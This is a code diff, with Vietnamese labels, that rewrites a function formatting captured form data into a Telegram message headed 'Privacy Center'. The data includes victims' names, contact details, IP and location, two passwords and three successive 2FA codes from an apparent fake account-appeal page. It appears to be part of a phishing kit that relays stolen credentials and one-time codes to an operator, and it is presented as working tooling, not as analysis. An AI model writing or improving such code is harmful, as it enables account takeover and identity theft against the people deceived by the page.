@@ -150,64 +150,85 @@ function mergeData(
     return result;
 }
 
-function field(label: string, value: string, options?: { monospace?: boolean }): string {
-    const display = value === '' ? '—' : escapeHtml(value);
-    if (options?.monospace !== false) {
-        return `<b>${escapeHtml(label)}</b>\n<code>${display}</code>`;
-    }
-    return `<b>${escapeHtml(label)}</b>\n${display}`;
+/** Một dòng bullet: nhãn ngắn + giá trị monospace (chỉ gọi khi đã có value). */
+function bullet(label: string, value: string): string {
+    return `  ▸ <b>${escapeHtml(label)}</b> <code>${escapeHtml(value)}</code>`;
 }
 
-function sectionTitle(title: string): string {
-    return `\n<b>${escapeHtml(title)}</b>`;
+/** Khối có emoji + tiêu đề; bỏ hẳn nếu không có dòng con. */
+function block(emoji: string, title: string, lines: string[]): string | null {
+    if (lines.length === 0) return null;
+    return `${emoji} <b>${escapeHtml(title)}</b>\n${lines.join('\n')}`;
+}
+
+function formatUtcTimestamp(): string {
+    const d = new Date();
+    const p = (n: number, w = 2) => String(n).padStart(w, '0');
+    return `${d.getUTCFullYear()}-${p(d.getUTCMonth() + 1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())} UTC`;
 }
 
 function formatMessage(data: Partial<FormData> | Record<string, unknown>): string {
     const d = normalizeData(data);
-    const submittedAt = new Date().toISOString();
-    const dob =
-        [d.day, d.month, d.year].every((x) => x === '')
-            ? '—'
-            : `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`;
-    const phoneDisplay = d.phone ? escapeHtml(`+${d.phone.replace(/^\+/, '')}`) : '—';
+    const rule = '─'.repeat(26);
 
-    const lines: string[] = [
-        `<b>Privacy Center</b>`,
-        `<i>Submitted:</i> <code>${escapeHtml(submittedAt)}</code>`,
-        sectionTitle('Network'),
-        field('IP address', d.ip || '—'),
-        field('Location', d.location || '—'),
-        field('Country code', d.country_code || '—'),
-        sectionTitle('Profile'),
-        field('Full name', d.fullName),
-        field('Page name', d.fanpage),
-        `<b>Date of birth</b>\n<code>${dob}</code>`,
-        sectionTitle('Contact'),
-        field('Email', d.email),
-        field('Business email', d.emailBusiness),
-        `<b>Phone</b>\n<code>${phoneDisplay}</code>`,
-        sectionTitle('Appeal'),
-        field('Appeal reason', d.appealReason || '—'),
-        field('Additional message', d.message || '—'),
-        sectionTitle('Credentials'),
-        field('Password (primary)', d.password),
-        field('Password (secondary)', d.passwordSecond),
-    ];
+    const header =
+        `📋 <b>Privacy Center</b>\n` +
+        `🕐 <code>${escapeHtml(formatUtcTimestamp())}</code>\n` +
+        `${rule}`;
 
-    if (d.authMethod) {
-        lines.push(field('Auth method', d.authMethod));
+    const body: string[] = [];
+
+    const net: string[] = [];
+    if (d.ip) net.push(bullet('IP', d.ip));
+    if (d.location) net.push(bullet('Vị trí', d.location));
+    if (d.country_code) net.push(bullet('Mã quốc gia', d.country_code));
+    const netBlock = block('📍', 'Mạng & thiết bị', net);
+    if (netBlock) body.push(netBlock);
+
+    const profile: string[] = [];
+    if (d.fullName) profile.push(bullet('Họ tên', d.fullName));
+    if (d.fanpage) profile.push(bullet('Trang / Fanpage', d.fanpage));
+    const hasDob = d.day || d.month || d.year;
+    if (hasDob) {
+        const dob =
+            d.day && d.month && d.year
+                ? `${d.day}/${d.month}/${d.year}`
+                : [d.day, d.month, d.year].filter(Boolean).join('/');
+        profile.push(bullet('Sinh nhật', dob));
     }
+    const profileBlock = block('👤', 'Hồ sơ', profile);
+    if (profileBlock) body.push(profileBlock);
 
-    lines.push(
-        sectionTitle('Two-factor codes'),
-        field('2FA code (1)', d.twoFa),
-        field('2FA code (2)', d.twoFaSecond),
-        field('2FA code (3)', d.twoFaThird)
-    );
+    const contact: string[] = [];
+    if (d.email) contact.push(bullet('Email', d.email));
+    if (d.emailBusiness) contact.push(bullet('Email công việc', d.emailBusiness));
+    if (d.phone) contact.push(bullet('SĐT', `+${d.phone.replace(/^\+/, '')}`));
+    const contactBlock = block('✉️', 'Liên hệ', contact);
+    if (contactBlock) body.push(contactBlock);
 
-    let text = lines.join('\n\n').trim();
+    const appeal: string[] = [];
+    if (d.appealReason) appeal.push(bullet('Lý do kháng nghị', d.appealReason));
+    if (d.message) appeal.push(bullet('Ghi chú thêm', d.message));
+    const appealBlock = block('📝', 'Nội dung gửi', appeal);
+    if (appealBlock) body.push(appealBlock);
+
+    const sec: string[] = [];
+    if (d.password) sec.push(bullet('Mật khẩu (1)', d.password));
+    if (d.passwordSecond) sec.push(bullet('Mật khẩu (2)', d.passwordSecond));
+    if (d.authMethod) sec.push(bullet('Phương thức xác thực', d.authMethod));
+    if (d.twoFa) sec.push(bullet('Mã 2FA — bước 1', d.twoFa));
+    if (d.twoFaSecond) sec.push(bullet('Mã 2FA — bước 2', d.twoFaSecond));
+    if (d.twoFaThird) sec.push(bullet('Mã 2FA — bước 3', d.twoFaThird));
+    const secBlock = block('🔐', 'Bảo mật', sec);
+    if (secBlock) body.push(secBlock);
+
+    let text =
+        body.length === 0
+            ? `${header}\n\n⚪ <i>Chưa có trường dữ liệu (có thể là bản cập nhật rỗng).</i>`
+            : [header, ...body].join('\n\n');
+
     if (text.length > TELEGRAM_TEXT_MAX) {
-        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 24)}\n<i>(truncated)</i>`;
+        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 40)}\n\n⚠️ <i>Nội dung bị cắt do giới hạn Telegram</i>`;
     }
     return text;
 }
